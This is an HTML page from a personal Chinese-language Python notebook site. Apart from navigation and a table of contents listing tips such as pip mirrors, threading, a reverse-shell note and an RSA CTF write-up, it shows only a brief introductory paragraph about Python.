



<!DOCTYPE html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
        <meta name="description" content="我的技术笔记本~">
      
      
      
        <meta name="author" content="chenyuan">
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-0.17.2, mkdocs-material-2.5.3">
    
    
      
        <title>Python - notebook</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/application.aa3de92b.css">
      
    
    
      <script src="../assets/javascripts/modernizr.1aa3b519.js"></script>
    
    
      
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
      <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    
    
    
  </head>
  
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="drawer">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="search">
    <label class="md-overlay" data-md-component="overlay" for="drawer"></label>
    
      <a href="#_1" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../README/" title="notebook" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            
              <span class="md-header-nav__topic">
                notebook
              </span>
              <span class="md-header-nav__topic">
                Python
              </span>
            
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          
            <label class="md-icon md-icon--search md-header-nav__button" for="search"></label>
            
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
          
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  


  <a href="https://github.com/zjuchenyuan/notebook/" title="Go to repository" class="md-source" data-md-source="github">
    
      <div class="md-source__icon">
        <svg viewBox="0 0 24 24" width="24" height="24">
          <use xlink:href="#github" width="24" height="24"></use>
        </svg>
      </div>
    
    <div class="md-source__repository">
      GitHub
    </div>
  </a>

          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="drawer">
    <span class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </span>
    notebook
  </label>
  
    <div class="md-nav__source">
      


  


  <a href="https://github.com/zjuchenyuan/notebook/" title="Go to repository" class="md-source" data-md-source="github">
    
      <div class="md-source__icon">
        <svg viewBox="0 0 24 24" width="24" height="24">
          <use xlink:href="#github" width="24" height="24"></use>
        </svg>
      </div>
    
    <div class="md-source__repository">
      GitHub
    </div>
  </a>

    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../README/" title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
    
    <label class="md-nav__link" for="nav-2">
      Python
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        Python
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="toc">
        Python
      </label>
    
    <a href="./" title="Python" class="md-nav__link md-nav__link--active">
      Python
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#pip" title="设置pip源" class="md-nav__link">
    设置pip源
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#shell" title="反弹shell" class="md-nav__link">
    反弹shell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tty" title="获得一个tty" class="md-nav__link">
    获得一个tty
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#requestsip" title="让requests使用多个IP" class="md-nav__link">
    让requests使用多个IP
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python" title="Python多线程模板" class="md-nav__link">
    Python多线程模板
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#httpserverbasehttpserver" title="http.server（BaseHTTPServer）并发性改善" class="md-nav__link">
    http.server（BaseHTTPServer）并发性改善
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#new-version" title="New version 不必修改库代码" class="md-nav__link">
    New version 不必修改库代码
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#old-version" title="Old version 修改库代码(不建议)" class="md-nav__link">
    Old version 修改库代码(不建议)
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rootpython" title="无root权限安装Python" class="md-nav__link">
    无root权限安装Python
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" title="中文输出乱码问题" class="md-nav__link">
    中文输出乱码问题
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pep8" title="遵循PEP8检查你的代码" class="md-nav__link">
    遵循PEP8检查你的代码
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" title="生成随机字符串" class="md-nav__link">
    生成随机字符串
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python_1" title="Python解方程" class="md-nav__link">
    Python解方程
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#in" title="大数据判断in" class="md-nav__link">
    大数据判断in
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonh-no-such-file-or-directory" title="解决Python.h: No such file or directory" class="md-nav__link">
    解决Python.h: No such file or directory
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" title="二进制字符串转普通字符串" class="md-nav__link">
    二进制字符串转普通字符串
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#bytes" title="十六进制字符串转bytes字符串" class="md-nav__link">
    十六进制字符串转bytes字符串
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python3pat" title="用Python3写PAT心得" class="md-nav__link">
    用Python3写PAT心得
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#requestspost" title="用requests进行post" class="md-nav__link">
    用requests进行post
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tkinter" title="通过tkinter获取、修改剪贴板" class="md-nav__link">
    通过tkinter获取、修改剪贴板
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_5" title="符号数与无符号数转换" class="md-nav__link">
    符号数与无符号数转换
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_6" title="无符号→有符号，为了加上负号：" class="md-nav__link">
    无符号→有符号，为了加上负号：
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_7" title="有符号→无符号，为了去掉负号：" class="md-nav__link">
    有符号→无符号，为了去掉负号：
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#signalsigalrm-only-linux" title="使用signal.SIGALRM在限定时间后退出进程 (only Linux)" class="md-nav__link">
    使用signal.SIGALRM在限定时间后退出进程 (only Linux)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ctrlc" title="捕捉用户的Ctrl+C" class="md-nav__link">
    捕捉用户的Ctrl+C
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#signalsigalrm-only-linux_1" title="使用signal.SIGALRM实现定时器 (only Linux)" class="md-nav__link">
    使用signal.SIGALRM实现定时器 (only Linux)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pdb" title="使用pdb进行调试" class="md-nav__link">
    使用pdb进行调试
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonserverlessfunction-as-service" title="使用Python开发Serverless(Function as Service)后端服务" class="md-nav__link">
    使用Python开发Serverless(Function as Service)后端服务
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_8" title="踩过的坑与解决过程(论阿里云是怎么把人气死的)" class="md-nav__link">
    踩过的坑与解决过程(论阿里云是怎么把人气死的)
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1api" title="1.API网关与函数计算的对接" class="md-nav__link">
    1.API网关与函数计算的对接
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2api" title="2.修改API网关参数定义后要再次发布" class="md-nav__link">
    2.修改API网关参数定义后要再次发布
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3windowsfclifcliexe" title="3.不能使用Windows版本的fcli工具(fcli.exe)" class="md-nav__link">
    3.不能使用Windows版本的fcli工具(fcli.exe)
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#linuxgbk" title="修复Linux下gbk编码的文件名" class="md-nav__link">
    修复Linux下gbk编码的文件名
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#crack-rsa" title="Crack RSA!" class="md-nav__link">
    Crack RSA!
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" title="题目信息" class="md-nav__link">
    题目信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rsa" title="RSA是啥" class="md-nav__link">
    RSA是啥
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" title="破解的数学原理" class="md-nav__link">
    破解的数学原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" title="实现它" class="md-nav__link">
    实现它
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ne" title="题目给的公钥是啥格式，怎么读取出N和e?" class="md-nav__link">
    题目给的公钥是啥格式，怎么读取出N和e?
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#n-pq" title="怎么分解n 得到p和q？" class="md-nav__link">
    怎么分解n 得到p和q？
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#d" title="怎么计算私钥d" class="md-nav__link">
    怎么计算私钥d
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flagencint" title="怎么把flag.enc当成一个int读入？" class="md-nav__link">
    怎么把flag.enc当成一个int读入？
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" title="计算明文" class="md-nav__link">
    计算明文
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flag" title="明文这么一个大数 我要的flag呢？" class="md-nav__link">
    明文这么一个大数 我要的flag呢？
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_13" title="完整的代码" class="md-nav__link">
    完整的代码
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_14" title="时间戳与字符串相互转换" class="md-nav__link">
    时间戳与字符串相互转换
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#redis" title="用redis存储字典" class="md-nav__link">
    用redis存储字典
  </a>
  
</li>
      
      
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../gist/" title="Gist Python一些常用代码片段" class="md-nav__link">
      Gist Python一些常用代码片段
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      Programming Languages
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        Programming Languages
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../BASH/" title="BASH" class="md-nav__link">
      BASH
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../BAT/" title="BAT批处理" class="md-nav__link">
      BAT批处理
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../C/" title="C语言" class="md-nav__link">
      C语言
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4" type="checkbox" id="nav-3-4">
    
    <label class="md-nav__link" for="nav-3-4">
      Java
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="5">
      <label class="md-nav__title" for="nav-3-4">
        Java
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../Java/" title="Java" class="md-nav__link">
      Java
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../S2-045/" title="S2-045" class="md-nav__link">
      S2-045
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../JavaScript/" title="JavaScript" class="md-nav__link">
      JavaScript
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../PHP/" title="PHP" class="md-nav__link">
      PHP
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
    
    <label class="md-nav__link" for="nav-4">
      Website & Network
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        Website & Network
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../CC98/" title="CC98 OAuth2" class="md-nav__link">
      CC98 OAuth2
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../CDN/" title="CDN" class="md-nav__link">
      CDN
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../cURL/" title="cURL" class="md-nav__link">
      cURL
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-4" type="checkbox" id="nav-4-4">
    
    <label class="md-nav__link" for="nav-4-4">
      Favorites
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="5">
      <label class="md-nav__title" for="nav-4-4">
        Favorites
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../Favorites/" title="Favorites" class="md-nav__link">
      Favorites
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../GithubProjectRecommendation/" title="Github Project Recommendation" class="md-nav__link">
      Github Project Recommendation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Links/" title="更多链接" class="md-nav__link">
      更多链接
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Jekyll/" title="Jekyll" class="md-nav__link">
      Jekyll
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../MySQL/" title="MySQL" class="md-nav__link">
      MySQL
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Nginx/" title="Nginx" class="md-nav__link">
      Nginx
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
    
    <label class="md-nav__link" for="nav-5">
      Developer
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        Developer
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../Developer/" title="Developer" class="md-nav__link">
      Developer
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Docker/" title="Docker" class="md-nav__link">
      Docker
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Git/" title="Git" class="md-nav__link">
      Git
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../WindowsSoftware/" title="WindowsSoftware" class="md-nav__link">
      WindowsSoftware
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
    
    <label class="md-nav__link" for="nav-6">
      Linux
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-6">
        Linux
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../Linux-backup/" title="Linux-backup" class="md-nav__link">
      Linux-backup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Linux-setup/" title="Linux-setup" class="md-nav__link">
      Linux-setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Linux-SSH/" title="Linux-SSH" class="md-nav__link">
      Linux-SSH
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Linux-cli/" title="Linux-cli" class="md-nav__link">
      Linux-cli
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Linux-VirtualBox/" title="Linux-VirtualBox" class="md-nav__link">
      Linux-VirtualBox
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Ubuntu/" title="Ubuntu" class="md-nav__link">
      Ubuntu
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#pip" title="设置pip源" class="md-nav__link">
    设置pip源
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#shell" title="反弹shell" class="md-nav__link">
    反弹shell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tty" title="获得一个tty" class="md-nav__link">
    获得一个tty
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#requestsip" title="让requests使用多个IP" class="md-nav__link">
    让requests使用多个IP
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python" title="Python多线程模板" class="md-nav__link">
    Python多线程模板
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#httpserverbasehttpserver" title="http.server（BaseHTTPServer）并发性改善" class="md-nav__link">
    http.server（BaseHTTPServer）并发性改善
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#new-version" title="New version 不必修改库代码" class="md-nav__link">
    New version 不必修改库代码
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#old-version" title="Old version 修改库代码(不建议)" class="md-nav__link">
    Old version 修改库代码(不建议)
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rootpython" title="无root权限安装Python" class="md-nav__link">
    无root权限安装Python
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" title="中文输出乱码问题" class="md-nav__link">
    中文输出乱码问题
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pep8" title="遵循PEP8检查你的代码" class="md-nav__link">
    遵循PEP8检查你的代码
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" title="生成随机字符串" class="md-nav__link">
    生成随机字符串
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python_1" title="Python解方程" class="md-nav__link">
    Python解方程
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#in" title="大数据判断in" class="md-nav__link">
    大数据判断in
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonh-no-such-file-or-directory" title="解决Python.h: No such file or directory" class="md-nav__link">
    解决Python.h: No such file or directory
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" title="二进制字符串转普通字符串" class="md-nav__link">
    二进制字符串转普通字符串
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#bytes" title="十六进制字符串转bytes字符串" class="md-nav__link">
    十六进制字符串转bytes字符串
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python3pat" title="用Python3写PAT心得" class="md-nav__link">
    用Python3写PAT心得
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#requestspost" title="用requests进行post" class="md-nav__link">
    用requests进行post
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tkinter" title="通过tkinter获取、修改剪贴板" class="md-nav__link">
    通过tkinter获取、修改剪贴板
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_5" title="符号数与无符号数转换" class="md-nav__link">
    符号数与无符号数转换
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_6" title="无符号→有符号，为了加上负号：" class="md-nav__link">
    无符号→有符号，为了加上负号：
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_7" title="有符号→无符号，为了去掉负号：" class="md-nav__link">
    有符号→无符号，为了去掉负号：
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#signalsigalrm-only-linux" title="使用signal.SIGALRM在限定时间后退出进程 (only Linux)" class="md-nav__link">
    使用signal.SIGALRM在限定时间后退出进程 (only Linux)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ctrlc" title="捕捉用户的Ctrl+C" class="md-nav__link">
    捕捉用户的Ctrl+C
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#signalsigalrm-only-linux_1" title="使用signal.SIGALRM实现定时器 (only Linux)" class="md-nav__link">
    使用signal.SIGALRM实现定时器 (only Linux)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pdb" title="使用pdb进行调试" class="md-nav__link">
    使用pdb进行调试
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonserverlessfunction-as-service" title="使用Python开发Serverless(Function as Service)后端服务" class="md-nav__link">
    使用Python开发Serverless(Function as Service)后端服务
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_8" title="踩过的坑与解决过程(论阿里云是怎么把人气死的)" class="md-nav__link">
    踩过的坑与解决过程(论阿里云是怎么把人气死的)
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1api" title="1.API网关与函数计算的对接" class="md-nav__link">
    1.API网关与函数计算的对接
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2api" title="2.修改API网关参数定义后要再次发布" class="md-nav__link">
    2.修改API网关参数定义后要再次发布
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3windowsfclifcliexe" title="3.不能使用Windows版本的fcli工具(fcli.exe)" class="md-nav__link">
    3.不能使用Windows版本的fcli工具(fcli.exe)
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#linuxgbk" title="修复Linux下gbk编码的文件名" class="md-nav__link">
    修复Linux下gbk编码的文件名
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#crack-rsa" title="Crack RSA!" class="md-nav__link">
    Crack RSA!
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" title="题目信息" class="md-nav__link">
    题目信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rsa" title="RSA是啥" class="md-nav__link">
    RSA是啥
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" title="破解的数学原理" class="md-nav__link">
    破解的数学原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" title="实现它" class="md-nav__link">
    实现它
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ne" title="题目给的公钥是啥格式，怎么读取出N和e?" class="md-nav__link">
    题目给的公钥是啥格式，怎么读取出N和e?
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#n-pq" title="怎么分解n 得到p和q？" class="md-nav__link">
    怎么分解n 得到p和q？
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#d" title="怎么计算私钥d" class="md-nav__link">
    怎么计算私钥d
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flagencint" title="怎么把flag.enc当成一个int读入？" class="md-nav__link">
    怎么把flag.enc当成一个int读入？
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" title="计算明文" class="md-nav__link">
    计算明文
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flag" title="明文这么一个大数 我要的flag呢？" class="md-nav__link">
    明文这么一个大数 我要的flag呢？
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_13" title="完整的代码" class="md-nav__link">
    完整的代码
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_14" title="时间戳与字符串相互转换" class="md-nav__link">
    时间戳与字符串相互转换
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#redis" title="用redis存储字典" class="md-nav__link">
    用redis存储字典
  </a>
  
</li>
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/zjuchenyuan/notebook/edit/master/Python.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                <h1 id="_1">写在前面<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
<p>嗯哼，Python很好玩呢&hellip;有人说Python是能运行的伪代码，就写代码的速度而言是显著优于C的，也有很多好用的类库呢，反正强烈推荐这门语言啦~</p>
<p>当你尝试一个包的时候，注意自己的py文件名称不能与包名重名，例如不要出现flask.py</p>
<hr />
